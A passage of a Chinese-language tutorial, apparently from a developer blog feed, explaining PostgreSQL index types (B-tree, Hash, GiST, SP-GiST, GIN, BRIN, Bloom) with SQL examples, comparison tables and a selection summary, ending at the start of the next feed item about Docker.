    username <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">50</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>,
    age <span class="hljs-type">INT</span>,
    register_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>
);

<span class="hljs-comment">-- 插入测试数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users (username, age) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'zhangsan'</span>, <span class="hljs-number">25</span>), (<span class="hljs-string">'lisi'</span>, <span class="hljs-number">30</span>), (<span class="hljs-string">'wangwu'</span>, <span class="hljs-number">28</span>), (<span class="hljs-string">'zhaoliu'</span>, <span class="hljs-number">35</span>);
</code></pre>
<p><strong>步骤2：创建 B-tree 索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 为 age 列创建 B-tree 索引（默认类型，可省略 USING BTREE）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_users_age <span class="hljs-keyword">ON</span> users (age);

<span class="hljs-comment">-- 为 register_time 列创建 B-tree 索引（支持范围/排序）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_users_register_time <span class="hljs-keyword">ON</span> users (register_time);
</code></pre>
<p><strong>步骤3：索引生效的查询场景</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 等值查询（命中 idx_users_age）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">=</span> <span class="hljs-number">30</span>;

<span class="hljs-comment">-- 范围查询（命中 idx_users_age）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> age <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">25</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">30</span>;

<span class="hljs-comment">-- 排序查询（命中 idx_users_register_time）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> register_time <span class="hljs-keyword">DESC</span> LIMIT <span class="hljs-number">2</span>;

<span class="hljs-comment">-- 模式匹配（前缀匹配，命中 idx_users_username）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_users_username <span class="hljs-keyword">ON</span> users (username);
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'zhang%'</span>;
</code></pre>
<h3 data-id="heading-6">2.2 Hash 索引</h3>
<h4 data-id="heading-7">2.2.1 核心特性</h4>
<p>存储索引列的 32 位哈希值，仅支持<strong>简单等值比较</strong>，功能单一但等值查询效率高，适用场景有限。</p>
<h4 data-id="heading-8">2.2.2 支持的操作符</h4>
<p>仅等值判断：=</p>
<h4 data-id="heading-9">2.2.3 实操样例</h4>
<p><strong>步骤1：创建 Hash 索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 为 username 列创建 Hash 索引（仅支持等值）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_users_username_hash <span class="hljs-keyword">ON</span> users <span class="hljs-keyword">USING</span> HASH (username);
</code></pre>
<p><strong>步骤2：索引生效的查询场景</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 纯等值查询（命中 Hash 索引）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-operator">=</span> <span class="hljs-string">'lisi'</span>;

<span class="hljs-comment">-- 注意：以下场景 Hash 索引不生效，会走全表扫描</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> username <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'li%'</span>; <span class="hljs-comment">-- 范围/模糊查询不支持</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> age <span class="hljs-operator">=</span> <span class="hljs-number">28</span>; <span class="hljs-comment">-- 未创建 Hash 索引的列</span>
</code></pre>
<h3 data-id="heading-10">2.3 GiST 索引</h3>
<h4 data-id="heading-11">2.3.1 核心特性</h4>
<p>GiST（Generalized Search Tree）并非单一索引，而是<strong>通用索引框架</strong>，可实现多种索引策略，支持复杂数据类型（如空间几何、全文检索）和“最近邻”搜索。</p>
<h4 data-id="heading-12">2.3.2 支持的操作符（以二维几何类型为例）</h4>
<p>空间关系：&lt;&lt;（左侧）、&amp;&lt;（重叠左侧）、&amp;&gt;（重叠右侧）、&gt;&gt;（右侧）、&lt;&lt;|（下侧）、&amp;&lt;|（重叠下侧）、|&amp;&gt;（重叠上侧）、|&gt;&gt;（上侧）、@&gt;（包含）、&lt;@（被包含）、~=（相等）、&amp;&amp;（相交）；最近邻搜索：&lt;-&gt;（距离运算符，用于按距离排序）</p>
<h4 data-id="heading-13">2.3.3 实操样例（空间数据场景）</h4>
<p><strong>步骤1：启用 PostGIS 扩展（需先安装）</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EXTENSION IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> postgis;
</code></pre>
<p><strong>步骤2：创建空间数据表并插入数据</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建地点表（包含地理坐标）</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> places (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
    name <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),
    location GEOGRAPHY(POINT) <span class="hljs-comment">-- 地理坐标类型</span>
);

<span class="hljs-comment">-- 插入测试地点（纬度、经度）</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> places (name, location) <span class="hljs-keyword">VALUES</span>
(<span class="hljs-string">'公园'</span>, ST_SetSRID(ST_MakePoint(<span class="hljs-number">116.40</span>, <span class="hljs-number">39.90</span>), <span class="hljs-number">4326</span>)),
(<span class="hljs-string">'商场'</span>, ST_SetSRID(ST_MakePoint(<span class="hljs-number">116.41</span>, <span class="hljs-number">39.91</span>), <span class="hljs-number">4326</span>)),
(<span class="hljs-string">'学校'</span>, ST_SetSRID(ST_MakePoint(<span class="hljs-number">116.39</span>, <span class="hljs-number">39.89</span>), <span class="hljs-number">4326</span>));
</code></pre>
<p><strong>步骤3：创建 GiST 索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 为地理坐标列创建 GiST 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_places_location <span class="hljs-keyword">ON</span> places <span class="hljs-keyword">USING</span> GIST (location);
</code></pre>
<p><strong>步骤4：索引生效的查询场景</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 空间包含查询（查找指定区域内的地点）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> places 
<span class="hljs-keyword">WHERE</span> ST_DWithin(location, ST_SetSRID(ST_MakePoint(<span class="hljs-number">116.40</span>, <span class="hljs-number">39.90</span>), <span class="hljs-number">4326</span>), <span class="hljs-number">1000</span>); <span class="hljs-comment">-- 1000 米范围内</span>

<span class="hljs-comment">-- 2. 最近邻搜索（查找离指定坐标最近的 2 个地点）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> places 
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> location <span class="hljs-operator">&lt;</span><span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> ST_SetSRID(ST_MakePoint(<span class="hljs-number">116.40</span>, <span class="hljs-number">39.90</span>), <span class="hljs-number">4326</span>) 
LIMIT <span class="hljs-number">2</span>;
</code></pre>
<h3 data-id="heading-14">2.4 SP-GiST 索引</h3>
<h4 data-id="heading-15">2.4.1 核心特性</h4>
<p>SP-GiST（Space-Partitioned Generalized Search Tree）是另一种通用索引框架，支持非平衡磁盘数据结构（四叉树、k-d 树、基数树等），适配空间分区类查询，轻量化高效。</p>
<h4 data-id="heading-16">2.4.2 支持的操作符（以二维点类型为例）</h4>
<p>空间关系：&lt;&lt;（左侧）、&gt;&gt;（右侧）、~=（相等）、&lt;@（被包含）、&lt;&lt;|（下侧）、|&gt;&gt;（上侧）；最近邻搜索：支持（依赖具体操作符类，常用&lt;-&gt;距离运算符）</p>
<h4 data-id="heading-17">2.4.3 实操样例（二维点数据）</h4>
<p><strong>步骤1：创建二维点表并插入数据</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建二维点表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> points (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
    pos POINT <span class="hljs-comment">-- 二维点类型</span>
);

<span class="hljs-comment">-- 插入测试数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> points (pos) <span class="hljs-keyword">VALUES</span> 
(<span class="hljs-string">'(1,2)'</span>), (<span class="hljs-string">'(3,4)'</span>), (<span class="hljs-string">'(5,6)'</span>), (<span class="hljs-string">'(7,8)'</span>);
</code></pre>
<p><strong>步骤2：创建 SP-GiST 索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 为 pos 列创建 SP-GiST 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_points_pos <span class="hljs-keyword">ON</span> points <span class="hljs-keyword">USING</span> SP<span class="hljs-operator">-</span>GiST (pos);
</code></pre>
<p><strong>步骤3：索引生效的查询场景</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 空间范围查询（查找 x 轴小于 5 的点）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> points <span class="hljs-keyword">WHERE</span> pos <span class="hljs-operator">&lt;&lt;</span> <span class="hljs-string">'(5,5)'</span>; <span class="hljs-comment">-- &lt;&lt; 表示左侧（x 更小）</span>

<span class="hljs-comment">-- 2. 最近邻搜索（查找离 (4,4) 最近的点）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> points 
<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> pos <span class="hljs-operator">&lt;</span><span class="hljs-operator">-</span><span class="hljs-operator">&gt;</span> <span class="hljs-string">'(4,4)'</span> 
LIMIT <span class="hljs-number">1</span>;
</code></pre>
<h3 data-id="heading-18">2.5 GIN 索引</h3>
<h4 data-id="heading-19">2.5.1 核心特性</h4>
<p>GIN（Generalized Inverted Index，倒排索引）专为<strong>多值数据类型</strong>设计，为每个组成值建立独立索引项，高效支持“包含/存在”类查询，是数组、JSONB、全文检索的首选索引。</p>
<h4 data-id="heading-20">2.5.2 支持的操作符（以数组类型为例）</h4>
<p>包含/存在：&lt;@（被包含，如数组A &lt;@ 数组B表示A是B的子集）、@&gt;（包含，如数组A @&gt; 数组B表示B是A的子集）、=（相等）、&amp;&amp;（相交，两数组有共同元素）</p>
<h4 data-id="heading-21">2.5.3 实操样例（数组/JSONB 场景）</h4>
<p><strong>场景1：数组查询</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 创建带数组列的表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> articles (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
    title <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">100</span>),
    tags TEXT[] <span class="hljs-comment">-- 标签数组</span>
);

<span class="hljs-comment">-- 2. 插入测试数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> articles (title, tags) <span class="hljs-keyword">VALUES</span>
(<span class="hljs-string">'PostgreSQL 索引'</span>, <span class="hljs-keyword">ARRAY</span>[<span class="hljs-string">'postgres'</span>, <span class="hljs-string">'数据库'</span>, <span class="hljs-string">'索引'</span>]),
(<span class="hljs-string">'Python 教程'</span>, <span class="hljs-keyword">ARRAY</span>[<span class="hljs-string">'python'</span>, <span class="hljs-string">'编程'</span>, <span class="hljs-string">'教程'</span>]),
(<span class="hljs-string">'GIS 空间分析'</span>, <span class="hljs-keyword">ARRAY</span>[<span class="hljs-string">'gis'</span>, <span class="hljs-string">'postgres'</span>, <span class="hljs-string">'空间数据'</span>]);

<span class="hljs-comment">-- 3. 创建 GIN 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_articles_tags <span class="hljs-keyword">ON</span> articles <span class="hljs-keyword">USING</span> GIN (tags);

<span class="hljs-comment">-- 4. 索引生效的查询（包含指定标签）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> articles <span class="hljs-keyword">WHERE</span> tags @<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">ARRAY</span>[<span class="hljs-string">'postgres'</span>]; <span class="hljs-comment">-- 包含 postgres 标签</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> articles <span class="hljs-keyword">WHERE</span> tags <span class="hljs-operator">&amp;&amp;</span> <span class="hljs-keyword">ARRAY</span>[<span class="hljs-string">'数据库'</span>, <span class="hljs-string">'编程'</span>]; <span class="hljs-comment">-- 交集（包含任一）</span>
</code></pre>
<p><strong>场景2：JSONB 查询</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 1. 创建带 JSONB 列的表</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> products (
    id SERIAL <span class="hljs-keyword">PRIMARY</span> KEY,
    info JSONB <span class="hljs-comment">-- 产品信息（JSONB 类型）</span>
);

<span class="hljs-comment">-- 2. 插入测试数据</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> products (info) <span class="hljs-keyword">VALUES</span>
(<span class="hljs-string">'{"name": "手机", "price": 2999, "tags": ["数码", "通讯"]}'</span>),
(<span class="hljs-string">'{"name": "电脑", "price": 5999, "tags": ["数码", "办公"]}'</span>);

<span class="hljs-comment">-- 3. 创建 GIN 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_products_info <span class="hljs-keyword">ON</span> products <span class="hljs-keyword">USING</span> GIN (info);

<span class="hljs-comment">-- 4. 索引生效的查询（JSONB 包含键/值）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> info @<span class="hljs-operator">&gt;</span> <span class="hljs-string">'{"tags": ["数码"]}'</span>; <span class="hljs-comment">-- 包含数码标签</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> info <span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span> <span class="hljs-string">'name'</span> <span class="hljs-operator">=</span> <span class="hljs-string">'手机'</span>; <span class="hljs-comment">-- 等值查询（需结合操作符）</span>
</code></pre>
<h3 data-id="heading-22">2.6 BRIN 索引</h3>
<h4 data-id="heading-23">2.6.1 核心特性</h4>
<p>BRIN（Block Range Index，块范围索引）存储表物理块范围的<strong>值摘要信息</strong>（最小值/最大值），占用空间极小，适配大数据量且物理顺序与逻辑顺序高度相关的场景（如时序日志表）。</p>
<h4 data-id="heading-24">2.6.2 支持的操作符（线性排序类型）</h4>
<p>基础比较：&lt;（小于）、&lt;=（小于等于）、=（等于）、&gt;=（大于等于）、&gt;（大于）</p>
<h4 data-id="heading-25">2.6.3 实操样例（时序日志表）</h4>
<p><strong>步骤1：创建日志表并插入有序数据</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 创建访问日志表（按时间有序插入）</span>
<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> access_logs (
    id SERIAL,
    user_id <span class="hljs-type">INT</span>,
    access_time <span class="hljs-type">TIMESTAMP</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-built_in">CURRENT_TIMESTAMP</span>,
    ip <span class="hljs-type">VARCHAR</span>(<span class="hljs-number">20</span>)
);

<span class="hljs-comment">-- 插入 10 万条测试数据（模拟时间有序的日志）</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> access_logs (user_id, ip)
<span class="hljs-keyword">SELECT</span> 
    <span class="hljs-built_in">floor</span>(random() <span class="hljs-operator">*</span> <span class="hljs-number">1000</span>)::<span class="hljs-type">INT</span>, 
    <span class="hljs-string">'192.168.'</span> <span class="hljs-operator">||</span> <span class="hljs-built_in">floor</span>(random() <span class="hljs-operator">*</span> <span class="hljs-number">255</span>)::<span class="hljs-type">INT</span> <span class="hljs-operator">||</span> <span class="hljs-string">'.'</span> <span class="hljs-operator">||</span> <span class="hljs-built_in">floor</span>(random() <span class="hljs-operator">*</span> <span class="hljs-number">255</span>)::<span class="hljs-type">INT</span>
<span class="hljs-keyword">FROM</span> generate_series(<span class="hljs-number">1</span>, <span class="hljs-number">100000</span>);
</code></pre>
<p><strong>步骤2：创建 BRIN 索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 为 access_time 列创建 BRIN 索引（物理有序，效率高）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_access_logs_time <span class="hljs-keyword">ON</span> access_logs <span class="hljs-keyword">USING</span> BRIN (access_time);
</code></pre>
<p><strong>步骤3：索引生效的查询场景</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 范围查询（命中 BRIN 索引，快速定位块范围）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">COUNT</span>(<span class="hljs-operator">*</span>) <span class="hljs-keyword">FROM</span> access_logs 
<span class="hljs-keyword">WHERE</span> access_time <span class="hljs-keyword">BETWEEN</span> <span class="hljs-string">'2026-01-01 00:00:00'</span> <span class="hljs-keyword">AND</span> <span class="hljs-string">'2026-01-01 12:00:00'</span>;

<span class="hljs-comment">-- 注意：若数据物理无序，BRIN 索引会失效，优先选 B-tree</span>
</code></pre>
<h3 data-id="heading-26">2.7 扩展索引：Bloom</h3>
<h4 data-id="heading-27">2.7.1 核心特性</h4>
<p>Bloom 是 PostgreSQL 扩展提供的索引类型，基于布隆过滤器实现，适用于<strong>多列等值查询</strong>，可大幅减少多列组合索引的存储空间，但存在假阳性（需回表验证）。</p>
<h4 data-id="heading-28">2.7.2 实操样例</h4>
<p><strong>步骤1：启用 bloom 扩展</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">CREATE</span> EXTENSION IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> bloom;
</code></pre>
<p><strong>步骤2：创建 Bloom 索引</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 为 user_id 和 ip 多列创建 Bloom 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_access_logs_bloom <span class="hljs-keyword">ON</span> access_logs 
<span class="hljs-keyword">USING</span> bloom (user_id, ip)
<span class="hljs-keyword">WITH</span> (length<span class="hljs-operator">=</span><span class="hljs-number">80</span>, col1<span class="hljs-operator">=</span><span class="hljs-number">2</span>, col2<span class="hljs-operator">=</span><span class="hljs-number">4</span>); <span class="hljs-comment">-- length：索引长度；colN：各列的位数</span>
</code></pre>
<p><strong>步骤3：索引生效的查询场景</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 多列等值查询（命中 Bloom 索引）</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> ip <span class="hljs-operator">=</span> <span class="hljs-string">'192.168.10.20'</span>;
</code></pre>
<h4 data-id="heading-29">2.7.3 Bloom 索引 vs 传统多列组合索引（B-tree）</h4>
<p>在多列等值查询场景中，Bloom 索引和 B-tree 组合索引是两种常见方案，但设计理念、性能、适用场景差异显著，以下是详细对比：</p>
<h5 data-id="heading-30">1. 核心原理差异</h5>

























<table><thead><tr><th>维度</th><th>Bloom 索引</th><th>B-tree 组合索引</th></tr></thead><tbody><tr><td>存储结构</td><td>基于<strong>布隆过滤器</strong>，存储列的哈希值位图，不存储原始数据</td><td>基于平衡树，按列的组合顺序存储原始值（如 (col1, col2)）</td></tr><tr><td>存储空间</td><td>极小（MB 级），仅存储哈希位图，与表行数无关</td><td>较大（GB 级），需存储所有列的原始值，随行数线性增长</td></tr><tr><td>索引精度</td><td>存在<strong>假阳性</strong>（可能匹配到不存在的数据，需回表验证）</td><td>精准匹配，无假阳性</td></tr></tbody></table>
<h5 data-id="heading-31">2. 支持的查询场景</h5>






























<table><thead><tr><th>查询类型</th><th>Bloom 索引</th><th>B-tree 组合索引</th></tr></thead><tbody><tr><td>多列全等值查询</td><td>支持（如 <code>col1 = ? AND col2 = ?</code>）</td><td>支持（且精准）</td></tr><tr><td>前缀列查询</td><td>不支持（如仅查 <code>col1 = ?</code> 无法使用）</td><td>支持（组合索引的核心优势，如 (col1, col2) 支持仅查 col1）</td></tr><tr><td>范围查询</td><td>不支持（仅等值）</td><td>支持（如 <code>col1 = ? AND col2 &gt; ?</code>）</td></tr><tr><td>排序/分组</td><td>不支持</td><td>支持（按组合列排序）</td></tr></tbody></table>
<h5 data-id="heading-32">3. 实操对比样例</h5>
<p><strong><code>access_logs</code></strong> <strong>前提：复用前文 表（10 万条数据）</strong></p>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- 场景1：创建 B-tree 组合索引（col1=user_id, col2=ip）</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_access_logs_btree <span class="hljs-keyword">ON</span> access_logs (user_id, ip);

<span class="hljs-comment">-- 场景2：创建 Bloom 索引</span>
<span class="hljs-keyword">CREATE</span> INDEX idx_access_logs_bloom <span class="hljs-keyword">ON</span> access_logs 
<span class="hljs-keyword">USING</span> bloom (user_id, ip)
<span class="hljs-keyword">WITH</span> (length<span class="hljs-operator">=</span><span class="hljs-number">80</span>, col1<span class="hljs-operator">=</span><span class="hljs-number">2</span>, col2<span class="hljs-operator">=</span><span class="hljs-number">4</span>);

<span class="hljs-comment">-- 对比1：多列全等值查询</span>
<span class="hljs-comment">-- Bloom 索引生效（需回表验证假阳性）</span>
EXPLAIN ANALYZE <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> ip <span class="hljs-operator">=</span> <span class="hljs-string">'192.168.10.20'</span>;

<span class="hljs-comment">-- B-tree 组合索引生效（精准匹配，无需回表）</span>
EXPLAIN ANALYZE <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> ip <span class="hljs-operator">=</span> <span class="hljs-string">'192.168.10.20'</span>;

<span class="hljs-comment">-- 对比2：仅前缀列查询（Bloom 失效，B-tree 生效）</span>
<span class="hljs-comment">-- Bloom 索引不生效（仅查 user_id），走全表扫描</span>
EXPLAIN ANALYZE <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

<span class="hljs-comment">-- B-tree 组合索引生效（前缀列匹配）</span>
EXPLAIN ANALYZE <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;

<span class="hljs-comment">-- 对比3：范围查询（Bloom 失效，B-tree 生效）</span>
<span class="hljs-comment">-- Bloom 索引不生效（ip 用范围）</span>
EXPLAIN ANALYZE <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> ip <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'192.168.10.%'</span>;

<span class="hljs-comment">-- B-tree 组合索引生效（前缀列等值 + 后缀列范围）</span>
EXPLAIN ANALYZE <span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> access_logs <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-number">100</span> <span class="hljs-keyword">AND</span> ip <span class="hljs-keyword">LIKE</span> <span class="hljs-string">'192.168.10.%'</span>;
</code></pre>
<h5 data-id="heading-33">4. 适用场景选择</h5>

























<table><thead><tr><th>选 Bloom 索引</th><th>选 B-tree 组合索引</th></tr></thead><tbody><tr><td>多列<strong>全等值</strong>查询为主</td><td>需要支持前缀列查询、范围查询、排序</td></tr><tr><td>表数据量极大（千万/亿级），追求极小存储成本</td><td>数据量中等，追求查询精准度和多功能性</td></tr><tr><td>可接受少量假阳性（回表验证的性能损耗）</td><td>对查询精度要求高，不接受假阳性</td></tr><tr><td>多列无明显“前缀优先级”（无单列表查询）</td><td>有明确的前缀列查询需求（如仅查 user_id）</td></tr></tbody></table>
<h2 data-id="heading-34">3. 索引类型选择速查表</h2>





























































<table><thead><tr><th>索引类型</th><th>核心优势</th><th>典型适用场景</th><th>核心样例语句</th><th>备注</th></tr></thead><tbody><tr><td>B-tree</td><td>通用、支持排序/范围</td><td>常规等值/范围查询</td><td>CREATE INDEX idx ON tbl (col);</td><td>默认选择，覆盖 80%+ 场景</td></tr><tr><td>Hash</td><td>等值查询效率高</td><td>纯等值查询</td><td>CREATE INDEX idx ON tbl USING HASH (col);</td><td>功能单一，适用场景有限</td></tr><tr><td>GiST</td><td>复杂数据、最近邻</td><td>空间数据、全文检索</td><td>CREATE INDEX idx ON tbl USING GIST (geo_col);</td><td>需配合扩展（如 PostGIS）</td></tr><tr><td>SP-GiST</td><td>空间分区、轻量化</td><td>二维点/多维数据</td><td>CREATE INDEX idx ON tbl USING SP-GiST (pos_col);</td><td>非平衡结构，适配分区查询</td></tr><tr><td>GIN</td><td>多值数据、倒排索引</td><td>数组、JSONB、全文检索</td><td>CREATE INDEX idx ON tbl USING GIN (array_col);</td><td>多值数据首选索引</td></tr><tr><td>BRIN</td><td>低存储、大数据量有序表</td><td>日志表、时序数据</td><td>CREATE INDEX idx ON tbl USING BRIN (time_col);</td><td>仅适用于数据物理有序场景</td></tr><tr><td>Bloom</td><td>多列等值、低存储</td><td>多列组合等值查询（无前缀/范围需求）</td><td>CREATE INDEX idx ON tbl USING bloom (col1, col2);</td><td>对比 B-tree 组合索引：存储小但功能单一，有假阳性</td></tr></tbody></table>
<h2 data-id="heading-35">4. 总结</h2>
<ol>
<li><strong>优先选 B-tree</strong>：无特殊需求时，B-tree 可覆盖 80% 以上的常规查询场景，是默认且最通用的选择。</li>
<li><strong>专用场景选专用索引</strong>：处理空间数据用 GiST/SP-GiST，多值数据（数组/JSONB）用 GIN，大数据量有序表用 BRIN。</li>
<li><strong>多列查询选对索引</strong>：需支持前缀列、范围查询 → 选 B-tree 组合索引；仅多列全等值查询、追求低存储 → 选 Bloom 索引（接受假阳性）。</li>
<li><strong>样例可直接复用</strong>：文档中所有 SQL 样例均基于 PostgreSQL 14+ 编写，启用扩展（如 postgis、bloom）后可直接执行，便于快速验证索引效果。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端也必看的Docker 核心命令与实战指南]]></title>    <link>https://juejin.cn/post/7591799107486859274</link>    <guid>https://juejin.cn/post/7591799107486859274</guid>    <pubDate>2026-01-06T03:36:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7591799107486859274" data-draft-id="7591800417255194633" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端也必看的Docker 核心命令与实战指南"/> <meta itemprop="keywords" content="前端,后端,架构"/> <meta itemprop="datePublished" content="2026-01-06T03:36:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="timeweaver"/> <meta itemprop="url" content="https://juejin.cn/user/1341831509187863"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 